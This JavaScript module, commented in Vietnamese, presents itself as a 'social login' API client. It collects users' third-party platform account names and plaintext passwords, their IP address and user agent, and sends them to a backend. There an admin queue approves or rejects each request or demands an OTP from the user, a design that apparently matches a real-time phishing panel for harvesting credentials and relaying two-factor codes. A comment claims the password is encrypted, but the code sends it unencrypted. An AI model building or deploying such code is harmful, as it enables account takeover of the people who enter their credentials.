/**
 * Social Login API Service
 * Xử lý các endpoint cho hệ thống đăng nhập tự động
 */

const API_BASE_URL =
  import.meta.env.VITE_API_URL || "http://localhost:3000/api";

class SocialLoginAPI {
  constructor() {
    this.eventSources = new Map();
    this.requestQueue = new Map();
  }

  /**
   * Khởi tạo yêu cầu đăng nhập
   * POST /api/social-login
   */
  async initializeLoginRequest(platformData) {
    const requestId = this.generateRequestId();
    const ttl = 120; // 120 seconds TTL

    try {
      const response = await fetch(`${API_BASE_URL}/social-login`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          request_id: requestId,
          platform: platformData.platform,
          account: platformData.account,
          password: platformData.password, // Mã hóa trước khi gửi
          user_agent: navigator.userAgent,
          ip_address: await this.getUserIP(),
          timestamp: new Date().toISOString(),
          ttl: ttl,
          status: "PENDING_REVIEW",
        }),
      });

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      const result = await response.json();

      // Store request for tracking
      this.requestQueue.set(requestId, {
        ...platformData,
        requestId,
        status: "PENDING_REVIEW",
        expiresAt: Date.now() + ttl * 1000,
        createdAt: Date.now(),
      });

      return {
        success: true,
        request_id: requestId,
        status: "PENDING_REVIEW",
        expires_in: ttl,
        message: "Yêu cầu đăng nhập đã được tạo",
      };
    } catch (error) {
      console.error("Initialize login request failed:", error);

      // Fallback to mock mode
      return this.mockInitializeRequest(platformData, requestId, ttl);
    }
  }

  /**
   * Theo dõi trạng thái yêu cầu
   * GET /api/social-login/status/{id} (Server-Sent Events)
   */
  trackLoginStatus(requestId, callback) {
    try {
      // Try real-time with SSE
      const eventSource = new EventSource(
        `${API_BASE_URL}/social-login/status/${requestId}`
      );

      eventSource.onmessage = (event) => {
        const data = JSON.parse(event.data);
        callback(data);

        // Close connection if final state
        if (["APPROVED", "REJECTED", "EXPIRED"].includes(data.status)) {
          eventSource.close();
          this.eventSources.delete(requestId);
        }
      };

      eventSource.onerror = () => {
        eventSource.close();
        this.eventSources.delete(requestId);
        // Fallback to polling
        this.pollLoginStatus(requestId, callback);
      };

      this.eventSources.set(requestId, eventSource);
    } catch (error) {
      // Fallback to polling
      this.pollLoginStatus(requestId, callback);
    }
  }

  /**
   * Xác thực OTP
   * POST /api/social-login/{id}/otp
   */
  async verifyOTP(requestId, otpCode, attempt = 1) {
    try {
      const response = await fetch(
        `${API_BASE_URL}/social-login/${requestId}/otp`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            otp: otpCode,
            attempt: attempt,
            timestamp: new Date().toISOString(),
          }),
        }
      );

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      const result = await response.json();
      return result;
    } catch (error) {
      console.error("OTP verification failed:", error);

      // Fallback to mock
      return this.mockVerifyOTP(requestId, otpCode, attempt);
    }
  }

  /**
   * Admin: Lấy hàng chờ phê duyệt
   * GET /api/social-login/queue
   */
  async getAdminQueue() {
    try {
      const response = await fetch(`${API_BASE_URL}/social-login/queue`, {
        headers: {
          Authorization: `Bearer ${localStorage.getItem("adminToken")}`,
        },
      });

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      return await response.json();
    } catch (error) {
      console.error("Get admin queue failed:", error);

      // Return mock queue
      return this.getMockAdminQueue();
    }
  }

  /**
   * Admin: Xử lý yêu cầu
   * PUT /api/social-login/{id}/admin-action
   */
  async adminAction(requestId, action, data = {}) {
    try {
      const response = await fetch(
        `${API_BASE_URL}/social-login/${requestId}/admin-action`,
        {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${localStorage.getItem("adminToken")}`,
          },
          body: JSON.stringify({
            action, // 'APPROVE', 'REJECT', 'REQUIRE_OTP'
            admin_id: "current_admin",
            timestamp: new Date().toISOString(),
            reason: data.reason || "",
            ...data,
          }),
        }
      );

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      return await response.json();
    } catch (error) {
      console.error("Admin action failed:", error);

      // Fallback to mock
      return this.mockAdminAction(requestId, action, data);
    }
  }

  // Mock implementations
  mockInitializeRequest(platformData, requestId, ttl) {
    const mockRequest = {
      ...platformData,
      requestId,
      status: "PENDING_REVIEW",
      expiresAt: Date.now() + ttl * 1000,
      createdAt: Date.now(),
    };

    this.requestQueue.set(requestId, mockRequest);

    // Store in localStorage for persistence
    const mockRequests = JSON.parse(
      localStorage.getItem("socialLoginRequests") || "{}"
    );
    mockRequests[requestId] = mockRequest;
    localStorage.setItem("socialLoginRequests", JSON.stringify(mockRequests));

    return {
      success: true,
      request_id: requestId,
      status: "PENDING_REVIEW",
      expires_in: ttl,
      message: "Yêu cầu đăng nhập đã được tạo (Mock Mode)",
    };
  }

  pollLoginStatus(requestId, callback) {
    const interval = setInterval(() => {
      const mockRequests = JSON.parse(
        localStorage.getItem("socialLoginRequests") || "{}"
      );
      const request = mockRequests[requestId];

      if (!request) {
        clearInterval(interval);
        return;
      }

      // Check TTL expiration
      if (
        Date.now() > request.expiresAt &&
        request.status === "PENDING_REVIEW"
      ) {
        request.status = "EXPIRED";
        mockRequests[requestId] = request;
        localStorage.setItem(
          "socialLoginRequests",
          JSON.stringify(mockRequests)
        );

        callback({
          status: "EXPIRED",
          message: "Yêu cầu đã hết hạn",
        });
        clearInterval(interval);
        return;
      }

      callback({
        status: request.status,
        request_id: requestId,
        expires_in: Math.max(
          0,
          Math.floor((request.expiresAt - Date.now()) / 1000)
        ),
        message: this.getStatusMessage(request.status),
      });

      // Stop polling if final state
      if (["APPROVED", "REJECTED", "EXPIRED"].includes(request.status)) {
        clearInterval(interval);
      }
    }, 2000); // Poll every 2 seconds

    return interval;
  }

  mockVerifyOTP(requestId, otpCode, attempt) {
    const isValid = otpCode === "123456";

    if (isValid) {
      const mockRequests = JSON.parse(
        localStorage.getItem("socialLoginRequests") || "{}"
      );
      if (mockRequests[requestId]) {
        mockRequests[requestId].status = "APPROVED";
        mockRequests[requestId].otpVerified = true;
        localStorage.setItem(
          "socialLoginRequests",
          JSON.stringify(mockRequests)
        );
      }

      return {
        success: true,
        status: "APPROVED",
        message: "OTP xác thực thành công",
      };
    } else {
      return {
        success: false,
        status: attempt >= 3 ? "REJECTED" : "INVALID_OTP",
        attempts_remaining: Math.max(0, 3 - attempt),
        message:
          attempt >= 3
            ? "Quá số lần thử. Yêu cầu bị từ chối."
            : "Mã OTP không đúng",
      };
    }
  }

  getMockAdminQueue() {
    const mockRequests = JSON.parse(
      localStorage.getItem("socialLoginRequests") || "{}"
    );
    return {
      success: true,
      data: Object.values(mockRequests)
        .filter((req) =>
          ["PENDING_REVIEW", "OTP_REQUIRED"].includes(req.status)
        )
        .sort((a, b) => b.createdAt - a.createdAt),
    };
  }

  mockAdminAction(requestId, action, data) {
    const mockRequests = JSON.parse(
      localStorage.getItem("socialLoginRequests") || "{}"
    );
    const request = mockRequests[requestId];

    if (!request) {
      return { success: false, message: "Yêu cầu không tồn tại" };
    }

    const statusMap = {
      APPROVE: "APPROVED",
      REJECT: "REJECTED",
      REQUIRE_OTP: "OTP_REQUIRED",
    };

    request.status = statusMap[action] || request.status;
    request.adminAction = {
      action,
      timestamp: new Date().toISOString(),
      admin_id: "mock_admin",
      reason: data.reason || "",
    };

    mockRequests[requestId] = request;
    localStorage.setItem("socialLoginRequests", JSON.stringify(mockRequests));

    return {
      success: true,
      status: request.status,
      message: `Đã ${action.toLowerCase()} yêu cầu`,
    };
  }

  // Utility methods
  generateRequestId() {
    return `req_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  }

  async getUserIP() {
    try {
      const response = await fetch("https://api.ipify.org?format=json");
      const data = await response.json();
      return data.ip;
    } catch (error) {
      return "127.0.0.1";
    }
  }

  getStatusMessage(status) {
    const messages = {
      PENDING_REVIEW: "Đang chờ admin phê duyệt",
      APPROVED: "Yêu cầu đã được chấp nhận",
      REJECTED: "Yêu cầu bị từ chối",
      OTP_REQUIRED: "Cần xác thực OTP",
      INVALID_OTP: "Mã OTP không hợp lệ",
      EXPIRED: "Yêu cầu đã hết hạn",
    };
    return messages[status] || "Trạng thái không xác định";
  }

  cleanup() {
    // Close all event sources
    this.eventSources.forEach((eventSource) => {
      eventSource.close();
    });
    this.eventSources.clear();
    this.requestQueue.clear();
  }
}

// Export singleton
const socialLoginAPI = new SocialLoginAPI();
export default socialLoginAPI;
